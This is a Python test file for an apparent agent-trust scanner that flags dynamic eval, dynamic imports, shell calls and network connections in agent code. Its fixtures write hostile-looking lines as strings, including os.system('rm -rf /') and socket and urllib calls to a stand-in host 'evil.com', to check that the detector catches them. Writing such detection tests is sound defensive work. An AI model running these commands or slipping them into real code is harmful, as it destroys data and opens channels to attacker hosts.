from __future__ import annotations

from pathlib import Path

import pytest

from agentgate.trust.checks.static_code_signals import StaticCodeSignalsCheck
from agentgate.trust.config import TrustScanConfig
from agentgate.trust.context import TrustScanContext
from agentgate.trust.models import TrustSeverity
from agentgate.trust.normalizer import TrustSignal


@pytest.mark.asyncio
async def test_code_signal_detects_exec_pattern(tmp_path: Path) -> None:
    source = tmp_path / "src"
    source.mkdir()
    py_file = source / "agent.py"
    py_file.write_text("def run(x):\n    return eval(x)\n")

    config = TrustScanConfig(
        source_dir=source,
        image_ref="example:latest",
        manifest_path=None,
        output_dir=tmp_path / "out",
    )
    ctx = TrustScanContext(config=config)

    findings = await StaticCodeSignalsCheck().run(ctx)

    assert any(
        (not f.passed)
        and f.severity == TrustSeverity.HIGH
        and "dynamic exec/eval" in f.title.lower()
        for f in findings
    )


@pytest.mark.asyncio
async def test_scan_signals_emits_trust_signals(tmp_path: Path) -> None:
    source = tmp_path / "src"
    source.mkdir()
    py_file = source / "agent.py"
    py_file.write_text("def run(x):\n    return eval(x)\n")

    config = TrustScanConfig(
        source_dir=source,
        image_ref="example:latest",
        manifest_path=None,
        output_dir=tmp_path / "out",
    )
    ctx = TrustScanContext(config=config)

    signals = StaticCodeSignalsCheck().scan_signals(ctx)

    assert signals
    signal = signals[0]
    assert isinstance(signal, TrustSignal)
    assert signal.signal_type == "pattern_match"
    assert signal.detection_method == "heuristic"
    assert signal.source_location.endswith(":2")
    assert "eval" in signal.raw_evidence


def _make_ctx(source_dir: Path) -> TrustScanContext:
    config = TrustScanConfig(
        source_dir=source_dir,
        image_ref="example:latest",
        manifest_path=None,
        output_dir=source_dir / "output",
    )
    return TrustScanContext(config=config)


class TestExpandedPatterns:
    @pytest.mark.asyncio
    async def test_detects_dunder_import(self, tmp_path: Path) -> None:
        (tmp_path / "agent.py").write_text("mod = __import__('subprocess')\n")
        ctx = _make_ctx(tmp_path)
        findings = await StaticCodeSignalsCheck().run(ctx)
        failed = [f for f in findings if not f.passed]
        assert any("__import__" in f.summary or "dynamic import" in f.title.lower() for f in failed)

    @pytest.mark.asyncio
    async def test_detects_importlib(self, tmp_path: Path) -> None:
        (tmp_path / "agent.py").write_text("import importlib\nm = importlib.import_module('os')\n")
        ctx = _make_ctx(tmp_path)
        findings = await StaticCodeSignalsCheck().run(ctx)
        failed = [f for f in findings if not f.passed]
        assert any("importlib" in f.summary.lower() for f in failed)

    @pytest.mark.asyncio
    async def test_detects_os_system(self, tmp_path: Path) -> None:
        (tmp_path / "agent.py").write_text("import os\nos.system('rm -rf /')\n")
        ctx = _make_ctx(tmp_path)
        findings = await StaticCodeSignalsCheck().run(ctx)
        failed = [f for f in findings if not f.passed]
        assert any("os.system" in f.summary.lower() or "shell" in f.title.lower() for f in failed)

    @pytest.mark.asyncio
    async def test_detects_socket_connect(self, tmp_path: Path) -> None:
        (tmp_path / "agent.py").write_text("import socket\nsocket.connect(('evil.com', 80))\n")
        ctx = _make_ctx(tmp_path)
        findings = await StaticCodeSignalsCheck().run(ctx)
        failed = [f for f in findings if not f.passed]
        assert any("socket" in f.summary.lower() for f in failed)

    @pytest.mark.asyncio
    async def test_detects_urllib_urlopen(self, tmp_path: Path) -> None:
        (tmp_path / "agent.py").write_text("import urllib.request\nurllib.request.urlopen('http://evil.com')\n")
        ctx = _make_ctx(tmp_path)
        findings = await StaticCodeSignalsCheck().run(ctx)
        failed = [f for f in findings if not f.passed]
        assert any("urllib" in f.summary.lower() or "urlopen" in f.summary.lower() for f in failed)

    @pytest.mark.asyncio
    async def test_sock_instance_not_matched(self, tmp_path: Path) -> None:
        """socket.connect pattern should not match sock.connect (instance method)."""
        (tmp_path / "agent.py").write_text("sock = get_socket()\nsock.connect(('host', 80))\n")
        ctx = _make_ctx(tmp_path)
        findings = await StaticCodeSignalsCheck().run(ctx)
        failed = [f for f in findings if not f.passed]
        assert not any("socket" in f.summary.lower() for f in failed)

    @pytest.mark.asyncio
    async def test_run_uses_normalizer_context(self, tmp_path: Path) -> None:
        (tmp_path / "agent.py").write_text("def run(x):\n    return eval(x)\n")
        ctx = _make_ctx(tmp_path)
        ctx.file_classification_map = {Path("agent.py"): "test"}
        ctx.reachability_graph = {Path("agent.py"): "not_reached"}

        findings = await StaticCodeSignalsCheck().run(ctx)

        assert findings[0].severity == TrustSeverity.INFO
        assert getattr(findings[0], "base_severity", None) == TrustSeverity.HIGH
        assert getattr(findings[0], "context", None).file_class == "test"
